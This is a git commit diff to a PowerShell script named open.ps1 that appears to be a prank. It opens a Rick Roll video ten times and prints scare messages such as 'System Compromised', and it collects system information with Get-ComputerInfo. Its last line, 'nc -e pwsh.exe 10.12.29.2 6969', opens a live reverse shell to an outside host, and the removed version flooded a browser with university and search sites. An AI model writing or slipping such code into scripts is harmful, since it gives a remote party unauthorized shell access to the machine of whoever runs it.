b709d7a516086fd4fd232299c8d689909409e23e
wall-of-pain <105595965+wall-of-pain@users.noreply.github.com>
2022-12-04 14:12:27 +0530

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -1,2 +1,30 @@
+Start-Sleep -Seconds 2
+
+Write-Output "Rick Roll"
+
 Start-Sleep -Seconds 1
-for ($i=1; $i -le 100; $i++) {Start https://google.com;Start https://lms.bennett.edu.in;Start https://bennett.collpoll.com;Start https://www.bennett.edu.in;Start https://www.bing.com;Start https://yandex.com;Start https://www.instagram.com}
+
+for ($i = 1; $i -le 10; $i++) { Start-Process https://www.youtube.com/watch?v=dQw4w9WgXcQ}
+
+Start-Sleep -Seconds 2
+
+Write-Output "System Compromised"
+
+Start-Sleep -Seconds 2
+
+Write-Output "Get system information"
+
+Start-Sleep -Seconds 2
+
+Get-ComputerInfo -Property "*version"
+
+Start-Sleep -Seconds 2
+
+Write-Output "Get reverse shell"
+
+Start-Sleep -Seconds 2
+
+nc -e pwsh.exe 10.12.29.2 6969
+
+
+
